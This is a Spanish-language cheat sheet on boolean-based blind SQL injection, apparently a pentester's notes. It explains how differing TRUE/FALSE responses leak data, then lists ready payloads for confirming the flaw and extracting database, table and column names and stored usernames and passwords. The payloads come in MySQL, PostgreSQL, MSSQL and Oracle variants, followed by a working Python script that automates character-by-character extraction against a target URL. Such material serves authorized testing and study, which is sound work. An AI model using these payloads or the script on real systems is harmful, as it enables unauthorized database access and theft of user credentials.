# Blind-SQLI Boolean-based

No hay output visible de la base de datos. En su lugar, la aplicación devuelve respuestas diferentes según si la condición inyectada es TRUE o FALSE. A partir de esa diferencia se infiere información carácter a carácter.

**Indicadores de diferencia:**

* Contenido distinto en la página (aparece/desaparece un elemento)
* Código HTTP diferente (200 vs 302, 200 vs 500)
* Longitud de respuesta diferente
* Texto condicional ("Welcome back" vs nada)

### Confirmar vulnerabilidad

```sql
-- Condición TRUE → respuesta A
' AND 1=1 -- -
' AND 'a'='a' -- -

-- Condición FALSE → respuesta B
' AND 1=2 -- -
' AND 'a'='b' -- -

-- Si las respuestas son diferentes → vulnerable a Boolean-Based Blind
```

### Técnica: Extracción carácter a carácter

Se utiliza `substring()` para obtener un carácter en una posición dada y `ascii()` para comparar su valor numérico.

#### Sintaxis base

```sql
-- ¿El primer carácter de database() tiene ASCII > 100?
' AND ascii(substring(database(),1,1)) > 100 -- -

-- ¿Es exactamente ASCII 109 (= 'm')?
' AND ascii(substring(database(),1,1)) = 109 -- -
```

#### Flujo de extracción por bisección (más eficiente)

```
Carácter 1 de database():
> 64? TRUE  → rango [65-127]
> 96? TRUE  → rango [97-127]
> 111? FALSE → rango [97-111]
> 103? TRUE  → rango [104-111]
> 107? FALSE → rango [104-107]
> 105? TRUE  → rango [106-107]
> 106? FALSE → es 106 = 'j'
```

### Payloads de extracción

#### Longitud de un valor

```sql
-- Longitud de database()
' AND length(database()) = 1 -- -
' AND length(database()) = 2 -- -
' AND length(database()) > 5 -- -   → iterar hasta encontrar la longitud exacta

-- Longitud de una columna
' AND length((SELECT username FROM users LIMIT 0,1)) > 5 -- -
```

#### Extraer base de datos actual

```sql
' AND ascii(substring(database(),1,1)) > 64 -- -
' AND ascii(substring(database(),2,1)) > 64 -- -
' AND ascii(substring(database(),N,1)) = X -- -
```

#### Extraer nombre de tabla

```sql
' AND ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) > 64 -- -

' AND ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),N,1)) = X -- -
```

#### Extraer nombre de columna

```sql
' AND ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)) > 64 -- -
```

#### Extraer datos de la tabla

```sql
-- username del primer usuario
' AND ascii(substring((SELECT username FROM users LIMIT 0,1),1,1)) > 64 -- -
' AND ascii(substring((SELECT username FROM users LIMIT 0,1),N,1)) = X -- -

-- password del primer usuario
' AND ascii(substring((SELECT password FROM users LIMIT 0,1),1,1)) > 64 -- -
```

### Variantes por base de datos

#### MySQL

```sql
' AND substring(database(),1,1) = 'a' -- -
' AND mid(database(),1,1) = 'a' -- -
' AND left(database(),1) = 'a' -- -
```

#### PostgreSQL

```sql
' AND substring(current_database(),1,1) = 'a' -- -
' AND ascii(substring(current_database(),1,1)) > 96 -- -
```

#### MSSQL

```sql
' AND substring(db_name(),1,1) = 'a' -- -
' AND ascii(substring(db_name(),1,1)) > 96 -- -
-- En MSSQL: substring() en lugar de substr()
```

#### Oracle

```sql
' AND substr((SELECT ora_database_name FROM dual),1,1) = 'a' -- -
' AND ascii(substr((SELECT banner FROM v$version WHERE rownum=1),1,1)) > 96 -- -
```

### Condicionales IF / CASE para más control

```sql
-- MySQL — IF()
' AND IF(1=1, 1, 0) = 1 -- -
' AND IF(ascii(substring(database(),1,1))>96, 1, 0) = 1 -- -

-- MySQL — CASE
' AND CASE WHEN ascii(substring(database(),1,1))>96 THEN 1 ELSE 0 END = 1 -- -

-- PostgreSQL — CASE
' AND CASE WHEN ascii(substring(current_database(),1,1))>96 THEN 1 ELSE 0 END = 1 -- -

-- MSSQL — CASE
' AND CASE WHEN ascii(substring(db_name(),1,1))>96 THEN 1 ELSE 0 END = 1 -- -

-- Oracle — CASE
' AND CASE WHEN ascii(substr((SELECT ora_database_name FROM dual),1,1))>96 THEN 1 ELSE 0 END = 1 -- -
```

### Script Python básico de extracción

```python
import requests
import string

url = "https://target.com/item"
chars = string.ascii_lowercase + string.digits + string.punctuation

def extract(payload_template, max_length=30):
    result = ""
    for i in range(1, max_length + 1):
        for char in chars:
            ascii_val = ord(char)
            payload = payload_template.format(pos=i, val=ascii_val)
            r = requests.get(url, params={"id": payload})
            if "Welcome" in r.text:  # Ajustar según la respuesta TRUE
                result += char
                print(f"[+] Char {i}: {char} → {result}")
                break
    return result

# Ejemplo: extraer database()
template = "1 AND ascii(substring(database(),{pos},1))={val}-- -"
db_name = extract(template)
print(f"\n[+] Database: {db_name}")
```

### Tips

> Usar bisección binaria reduce las peticiones de \~127 a \~7 por carácter.

> Si la diferencia de respuesta es sutil (por longitud de bytes), usar `len(response.content)` en lugar de buscar texto.

> Si no hay diferencia visible entre TRUE/FALSE en el body, considerar pasar a Time-Based.

> Burp Suite Intruder + grep match es útil para automatizar esto sin scripts.
